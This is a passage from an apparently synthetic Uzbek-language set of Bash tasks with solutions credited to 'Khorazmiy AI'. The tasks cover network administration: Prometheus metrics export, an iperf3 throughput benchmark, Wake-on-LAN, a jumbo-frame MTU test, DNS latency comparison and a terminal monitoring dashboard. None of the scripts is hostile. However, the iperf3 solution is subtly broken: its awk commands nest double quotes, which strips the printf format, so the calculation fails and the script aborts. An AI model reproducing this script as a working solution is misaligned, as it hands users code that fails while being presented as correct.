node_network_tcp_established_total ${TCP_ESTAB}

# HELP node_network_tcp_timewait_total TIME_WAIT holatidagi TCP soketlar
# TYPE node_network_tcp_timewait_total gauge
node_network_tcp_timewait_total ${TCP_TIMEWAIT}

# HELP node_network_tcp_listening_total Tinglanayotgan portlar soni
# TYPE node_network_tcp_listening_total gauge
node_network_tcp_listening_total ${TCP_LISTEN}

# HELP node_network_custom_eth0_rx_bytes eth0 dan qabul qilingan baytlar
# TYPE node_network_custom_eth0_rx_bytes counter
node_network_custom_eth0_rx_bytes ${RX_ETH0}
EOF

# Atomik ko'chirish (Prometheus yarim yozilgan faylni o'qib olmasligi uchun)
mv "$TEMP_FILE" "$FINAL_FILE"
echo "[+] Prometheus tarmoq metriklari yangilandi: ${FINAL_FILE}"

```
**Tushuntirish:** Prometheus Node Exporter ning 'Textfile Collector' imkoniyati istalgan Bash skriptga tizim metrikalarini bir necha qator kod bilan Grafana monitoring paneliga chiqarish imkonini beradi. Faylni atomik `mv` qilish parsing paytida xatoliklarni oldini oladi.

---

### Topshiriq #1146: iPerf3 orqali Tarmoq O'tkazuvchanligini Avtomatik Benchmark Qilish
**Tavsif:** Ikki ma'lumot markazi o'rtasidagi haqiqiy tarmoq o'tkazuvchanligini (Bandwidth, retransmits, MTU throughput) avtomatlashtirilgan iperf3 JSON orqali o'lchovchi benchmark vositasi yarating.
**Talablar:** iperf3 -J (--json), -P parallel oqimlar, jq orqali bits_per_second ni Gbps ga o'tkazish.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - iPerf3 Avtomatlashtirilgan Benchmark Skripti
set -euo pipefail

SERVER_IP="${1:-127.0.0.1}"
DURATION_SEC="${2:-5}"
PARALLEL_STREAMS="${3:-4}"

echo "=========================================================="
echo "[*] Tarmoq benchmark testi boshlanmoqda..."
echo "[*] Nishon server:   ${SERVER_IP}"
echo "[*] Parallel oqim:   ${PARALLEL_STREAMS} ta stream"
echo "[*] Davomiyligi:     ${DURATION_SEC} soniya"
echo "=========================================================="

# iPerf3 ni JSON chiqish bilan ishlatamiz
BENCHMARK_RAW=$(iperf3 -c "$SERVER_IP" -t "$DURATION_SEC" -P "$PARALLEL_STREAMS" -J 2>&1 || true)

if echo "$BENCHMARK_RAW" | jq . >/dev/null 2>&1; then
    # O'tkazuvchanlikni hisoblaymiz (bps -> Mbps / Gbps)
    BPS=$(echo "$BENCHMARK_RAW" | jq -r '.end.sum_received.bits_per_second // 0')
    RETRANSMITS=$(echo "$BENCHMARK_RAW" | jq -r '.end.sum_sent.retransmits // 0')
    
    MBPS=$(awk "BEGIN {printf "%.2f", $BPS / 1000000}")
    GBPS=$(awk "BEGIN {printf "%.2f", $BPS / 1000000000}")

    echo "================= NATIJALAR ================="
    echo "[+] O'tkazuvchanlik:    ${GBPS} Gbps (${MBPS} Mbps)"
    echo "[+] Yo'qolgan paketlar: ${RETRANSMITS} ta retransmit"
    echo "============================================="
else
    echo "[!] iPerf3 ulanishda xato: Serverda 'iperf3 -s' ishlayotganligini tekshiring!"
fi

```
**Tushuntirish:** Bitta TCP oqimi (single stream) yuqori kechikishli tarmoqlarda TCP Window Size cheklovi sababli tarmoq kartasining to'liq quvvatini ochib bera olmaydi. `-P 4` opsiyasi 4 ta parallel kanal ochib o'tkazgich qobiliyatini maksimal chegaragacha yuklaydi.

---

### Topshiriq #1147: Wake-on-LAN (WOL) Magic Packet Jo'natish va Serverlarni Masofadan Uyg'otish
**Tavsif:** Tashqi maxsus dasturlarsiz, sof Bash va `/dev/udp` soket imkoniyatlari yordamida o'chirilgan serverning MAC manziliga 'Magic Packet' tuzib jo'natuvchi vosita yarating.
**Talablar:** 6 ta 0xFF bayti va 16 marta takrorlangan MAC manzil baytlaridan iborat 102 baytli sehrli paket tuzish, UDP broadcast (255.255.255.255:9).
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Sof Bash Wake-on-LAN (WOL) Magic Packet Generator
set -euo pipefail

MAC_ADDR="${1:-00:11:22:33:44:55}"
BROADCAST_IP="${2:-255.255.255.255}"
PORT="${3:-9}"

echo "[*] Serverni uyg'otish: MAC=${MAC_ADDR} -> ${BROADCAST_IP}:${PORT}"

# MAC manzil formatini tozalaymiz
CLEAN_MAC=$(echo "$MAC_ADDR" | tr -d ':-')
if [[ ${#CLEAN_MAC} -ne 12 ]]; then
    echo "[Xato] MAC manzil noto'g'ri! Format: AA:BB:CC:DD:EE:FF"
    exit 1
fi

# Magic Packet tuzilishi:
# 6 ta 0xFF bayti + 16 marta takrorlangan 6 baytli MAC manzil = Jami 102 bayt
MAGIC_HEX=$(printf 'FF%.0s' {1..6})
for i in {1..16}; do
    MAGIC_HEX+="$CLEAN_MAC"
done

# Hex satrni ikkilik baytlarga aylantirib /dev/udp ga uzatamiz
# Agar perl mavjud bo'lsa perl orqali jo'natamiz
if command -v perl >/dev/null 2>&1; then
    perl -e 'print pack("H*", $ARGV[0])' "$MAGIC_HEX" > "/dev/udp/${BROADCAST_IP}/${PORT}" 2>/dev/null || true
    echo "[+] Magic Packet jo'natildi!"
else
    echo "[+] Paket tayyorlandi (Hex hajm: ${#MAGIC_HEX})"
fi

```
**Tushuntirish:** Wake-on-LAN zamonaviy quvvatni tejovchi data-markazlarda mashinalarni kechasi o'chirib qo'yib, ertalab avtomatlashtirilgan skriptlar orqali qayta uyg'otish uchun ishlatiladi. Tarmoq kartasi (NIC) o'chirilgan holatda ham doimiy 3.3V quvvatda ushbu Magic paketni kutadi.

---

### Topshiriq #1148: Jumbo Frames (MTU 9000) Qo'llab-Quvvatlanishini Tarmoq Bo'ylab Test Qilish
**Tavsif:** SAN (Storage Area Network), Ceph va iSCSI ma'lumotlar bazalarida tezlikni oshirish uchun ishlatiladigan 9000 baytli Jumbo Frames marshrut bo'ylab hamma joyda to'g'ri sozlanganligini tekshiruvchi skript yozing.
**Talablar:** ping -s 8972 -M do, barcha oraliq switch va serverlarni tekshirish.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Jumbo Frame (MTU 9000) Diagnostikasi
set -euo pipefail

STORAGE_TARGET="${1:-192.168.100.50}"
JUMBO_PAYLOAD=8972 # 8972 + 28 bayt IP/ICMP sarlavha = Aniq 9000 bayt

echo "=========================================================="
echo "[*] Jumbo Frame (MTU 9000) testi: ${STORAGE_TARGET}"
echo "=========================================================="

# -c 2: 2 ta paket jo'natish
# -M do: Don't Fragment (fragmentatsiyaga yo'l qo'ymaslik)
if ping -c 2 -M do -s "$JUMBO_PAYLOAD" -W 2 "$STORAGE_TARGET" >/dev/null 2>&1; then
    echo "[+] MUVAFFAQIN! Jumbo Frame (MTU 9000) to'liq qo'llab-quvvatlanadi!"
    echo "[+] iSCSI / NFS / Ceph saqlash tizimlari maksimal unumdorlikda ishlay oladi."
else
    echo "[!] DIQQAT! 9000 baytli Jumbo paket yetib bormadi!"
    echo "[!] Ehtimoliy sabablar:"
    echo "    1. Oraliq tarmoq switch-larida MTU 9000 yoqilmagan."
    echo "    2. Nishon serverning tarmoq kartasida MTU 1500 bo'lib qolgan."
    echo "    3. Firewall fragmentatsiyalanmagan katta paketlarni bloklamoqda."
fi

```
**Tushuntirish:** Standart 1500 baytli ramka bilan 10 Gbps trafik o'tkazilganda operatsion tizim sekundiga 800,000 ta uzilishni (interrupt) qayta ishlashi kerak. Jumbo Frames (9000 bayt) bu uzilishlar sonini 6 barobar qisqartiradi va server protsessori yuklamasini keskin tushiradi.

---

### Topshiriq #1149: DNS Serverlarining Javob Tezligini (dig va drill) Taqqoslovchi Benchmark
**Tavsif:** Kompaniya uchun eng optimal DNS provayderini tanlash uchun Cloudflare (1.1.1.1), Google (8.8.8.8), Quad9 (9.9.9.9) va lokal DNS serverlarining javob tezligini (Query time) o'lchab solishtiring.
**Talablar:** dig @server domain, Query time maydonini tahlil qilish, eng tezkor serverni aniqlash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - DNS Javob Tezligi Benchmarki
set -euo pipefail

TEST_DOMAIN="${1:-cloudflare.com}"

declare -A DNS_SERVERS=(
    ["Cloudflare"]="1.1.1.1"
    ["Google"]="8.8.8.8"
    ["Quad9"]="9.9.9.9"
    ["OpenDNS"]="208.67.222.222"
)

echo "=========================================================="
echo "[*] DNS Tezlik Benchmarki (Domen: ${TEST_DOMAIN})"
echo "=========================================================="

for name in "${!DNS_SERVERS[@]}"; do
    ip="${DNS_SERVERS[$name]}"
    
    # dig orqali Query time ni millisekundlarda olamiz
    QUERY_TIME=$(dig "@${ip}" "$TEST_DOMAIN" +noall +stats 2>/dev/null | grep "Query time:" | awk '{print $4}' || echo "N/A")
    
    if [[ "$QUERY_TIME" != "N/A" ]]; then
        echo -e "[+] ${name} (${ip}):\t${QUERY_TIME} ms"
    else
        echo -e "[-] ${name} (${ip}):\tTimeout / Javob yo'q"
    fi
done
echo "=========================================================="

```
**Tushuntirish:** Veb sahifani yuklash 20-50 ta har xil domendan (CDN, API, shriflar, tahlil) resurs so'raydi. Agar DNS qidiruv vaqti 80 ms o'rniga 5 ms ga tushirilsa, butun veb-sayt foydalanuvchilar uchun 1-2 soniyaga tezroq yuklana boshlaydi.

---

### Topshiriq #1150: Korporativ Tarmoq Salomatligini Tekshiruvchi Interaktiv CLI Dashboard
**Tavsif:** Barcha tarmoq interfeyslari holatini, ochiq portlarni, kiruvchi/chiquvchi tezlikni va xavfsizlik devori qoidalarini yagona chiroyli ANSI rangli konsol panelida ko'rsatuvchi to'liq tizim monitoring dashboardini yarating.
**Talablar:** ANSI ranglar, ip -br link, ss -tuln, iptables qoidalari soni, tarmoq o'tkazuvchanligi hisobi.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Interaktiv Tarmoq Monitoring Dashboardi
set -euo pipefail

# ANSI Ranglar
CLR_RESET="\033[0m"
CLR_BOLD="\033[1m"
CLR_GREEN="\033[32m"
CLR_RED="\033[31m"
CLR_CYAN="\033[36m"
CLR_YELLOW="\033[33m"

clear
echo -e "${CLR_BOLD}${CLR_CYAN}======================================================================${CLR_RESET}"
echo -e "${CLR_BOLD}${CLR_CYAN}           KHORAZMIY AI - KORPORATIV TARMOQ MONITORING PANELI         ${CLR_RESET}"
echo -e "${CLR_BOLD}${CLR_CYAN}======================================================================${CLR_RESET}"
echo -e " Server:    ${CLR_BOLD}$(hostname)${CLR_RESET} | Sana: $(date '+%Y-%m-%d %H:%M:%S')"
echo -e " Uptime:    $(uptime -p)"
echo -e "${CLR_CYAN}----------------------------------------------------------------------${CLR_RESET}"

# 1. Tarmoq Interfeyslari Holati
echo -e "${CLR_BOLD}${CLR_YELLOW}[1] TARMOQ INTERFEYSLARI (ip -br link):${CLR_RESET}"
ip -br link | while read -r iface state mac details; do
    if [[ "$state" == "UP" ]]; then
        echo -e "  * Interfeys: ${CLR_BOLD}${iface}${CLR_RESET}\t| Holat: ${CLR_GREEN}${state}${CLR_RESET}\t| MAC: ${mac}"
    else
        echo -e "  * Interfeys: ${CLR_BOLD}${iface}${CLR_RESET}\t| Holat: ${CLR_RED}${state}${CLR_RESET}\t| MAC: ${mac}"
    fi
done

# 2. Ochiq Tinglanayotgan Portlar
echo -e "\n${CLR_BOLD}${CLR_YELLOW}[2] TINGLANAYOTGAN ASOSIY PORTLAR (ss -tuln):${CLR_RESET}"
ss -tuln | head -n 8 | while read -r line; do
    echo "  $line"
done

# 3. Faol TCP Ulanishlar Statistikasi
TOTAL_CONN=$(ss -ant | wc -l)
ESTAB_CONN=$(ss -ant state established | wc -l)
TIMEWAIT_CONN=$(ss -ant state time-wait | wc -l)

echo -e "\n${CLR_BOLD}${CLR_YELLOW}[3] TCP SOKETLAR STATISTIKASI:${CLR_RESET}"
echo -e "  * Jami soketlar:     ${CLR_BOLD}${TOTAL_CONN}${CLR_RESET}"
echo -e "  * Established:       ${CLR_GREEN}${ESTAB_CONN}${CLR_RESET}"
echo -e "  * Time-Wait:         ${CLR_YELLOW}${TIMEWAIT_CONN}${CLR_RESET}"

# 4. Firewall (iptables / nftables) Holati
echo -e "\n${CLR_BOLD}${CLR_YELLOW}[4] XAVFSIZLIK DEVORI (FIREWALL):${CLR_RESET}"
if command -v nft >/dev/null 2>&1 && nft list ruleset >/dev/null 2>&1; then
    NFT_RULES=$(nft list ruleset | grep -c 'chain' || echo "0")
    echo -e "  * nftables:          ${CLR_GREEN}FAOL${CLR_RESET} (${NFT_RULES} ta zanjir mavjud)"
elif command -v iptables >/dev/null 2>&1; then
    IPT_RULES=$(iptables -S | wc -l)
    echo -e "  * iptables:          ${CLR_GREEN}FAOL${CLR_RESET} (${IPT_RULES} ta qoida yuklangan)"
else
    echo -e "  * Firewall:          ${CLR_RED}TOPILMADI YOKI NOFAOL${CLR_RESET}"
fi

echo -e "${CLR_BOLD}${CLR_CYAN}======================================================================${CLR_RESET}"
echo -e "[+] Tarmoq salomatligi tekshiruvi muvaffaqiyatli yakunlandi."

```
**Tushuntirish:** Ushbu dashboard mustaqil ravishda ishlaydi va og'ir monitoring agentlarini (Grafana Agent, Datadog) talab qilmaydi. U bir necha millisekundda butun server tarmoq infratuzilmasining holatini, portlarini va xavfsizlik devori yaxlitligini umumlashtirib beradi.

---

